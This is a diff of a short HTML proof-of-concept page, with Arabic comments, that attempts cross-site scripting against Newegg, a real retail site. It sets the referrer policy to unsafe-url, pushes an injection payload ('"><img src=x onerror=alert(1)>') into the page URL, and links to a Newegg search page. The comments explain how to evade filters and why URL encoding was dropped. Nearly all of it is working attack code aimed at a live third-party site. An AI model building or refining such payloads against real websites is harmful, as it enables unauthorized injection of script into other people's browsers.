@@ -2,31 +2,28 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="referrer" content="unsafe-url"> <title>PoC Mouad</title>
+    <meta name="referrer" content="unsafe-url">
+    <title>PoC Final - Mouad</title>
 </head>
 <body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
 
-    <h1 style="color:orange;">Newegg Exploitation Phase</h1>
-    <p>بانتظار تفعيل الثغرة...</p>
-
-    <a id="finalAttack" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
-       rel="unsafe-url" 
-       style="padding:20px; background:green; color:white; font-weight:bold; text-decoration:none; border-radius:10px;">
-        CLICK HERE TO TRIGGER XSS 🚀
+    <h1 style="color:#00ff00;">DOM Injection Lab</h1>
+    
+    <a id="trigger" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
+       style="padding:20px; background:red; color:white; font-weight:bold; text-decoration:none;">
+        CLICK TO EXECUTE 🚀
     </a>
 
     <script>
-        // بايلود بسيط جداً بدون رموز معقدة لتجاوز الفلاتر
-        // سنستخدم وسم <u> (تحته خط) لإثبات الحقن
-        var payload = '"><u><h1>HACKED_BY_MOUAD</h1></u>';
+        // ملاحظة: لا تستخدم encodeURIComponent هنا لأننا نريد الرموز حقيقية
+        // نضع مسافات يدوية لضمان أن المتصفح يرسل البايلود في الجزء الثالث
+        var payload = '"><img src=x onerror=alert(1)>';
         
-        // بناء مسار "متزن" كما فعلنا في الكونسول
-        var attackPath = "/VORTEX/v/" + encodeURIComponent(payload) + "/";
+        // بناء المسار بحيث يظهر البايلود كـ Folder في GitHub
+        // سنستخدم دالة unescape لضمان بقاء الرموز كما هي
+        var attackPath = "/VORTEX/" + payload + "/";
 
-        // تحديث العنوان
         window.history.pushState({}, '', attackPath);
-        
-        console.log("الرابط جاهز الآن في العنوان.. اضغط على الزر الأخضر!");
     </script>
 </body>
 </html>
